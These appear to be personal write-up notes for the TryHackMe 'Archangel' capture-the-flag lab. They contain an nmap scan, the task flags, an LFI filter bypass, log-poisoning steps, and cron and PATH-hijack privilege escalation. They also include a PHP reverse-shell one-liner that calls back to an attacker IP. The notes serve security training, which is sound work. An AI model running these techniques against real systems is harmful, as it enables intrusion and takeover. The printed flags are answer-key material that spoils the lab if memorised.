TryHackMe.com

box = Archangel

export IP=10.10.35.201

# NMAP SCANS

```
Starting Nmap 7.91 (https://nmap.org) at 2021-02-07 07:11 EST
Nmap scan report for 10.10.35.201 (10.10.35.201)
Host is up (0.42s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Wavefire
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/.
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=2/7%OT=22%CT=1%CU=33561%PV=Y%DS=4%DC=T%G=Y%TM=601FD943
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=FC%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(O
OS:1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11N
OS:W6%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R
OS:=Y%DF=Y%T=40%W=F507%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%
OS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y
OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=
OS:40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S
OS:)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 995/tcp)
HOP RTT       ADDRESS
1   123.73 ms 10.4.0.1 (10.4.0.1)
2   ... 3
4   430.03 ms 10.10.35.201 (10.10.35.201)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
Nmap done: 1 IP address (1 host up) scanned in 51.71 seconds

```


# INTERESTING FINDS

• hostname=mafialive.thm
• /robots.txt page found on mafialive.thm which contains test.php
• LFI on test.php


# TASKS

1. Find a different hostname = mafialive.thm
2. Flag 1? = thm{f0und_th3_r1ght_h0st_n4m3}
3. Page under development = test.php
4. Flag 2? = thm{explo1t1ng_lf1}
5. Get a shell and find the user flag = thm{lf1_t0_rc3_1s_tr1cky}
6. Get user2 flag = thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}
7. Root the machine and root flag = thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n} 


## PRIVILEGE ESCALATION VECTORS
Methods Used:
 
 *Horizontal Privilege Escalation
   
   1) abusing write permission at cron job running as archangel user.
   2) by appending a reverse shell script on the cron job, we can login as archangel user.
 
 *Vertical Privilege Escalation
   1) looking at the /secret directory in archangel user, we can see that it using cp without preprending a path.
   2) we create malicious cp command that runs /bin/bash -p when called.
   3) running the backup file, will cause vertical privilege escalation.


## NOTES
• Connect to mafialive.thm
• sudo nano /etc/hosts
• by using nmap we can see /robots.txt page
• in the php filter wrapper: resource = (file or directory which the file reside)
• we can bypass LFI filters by ..//..//
• PHP reverse shell: php -r ‘$sock=fsockopen(“10.4.21.189”,9000);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’
• we can poison the access.log by adding a reverse shell script on user-agent via burp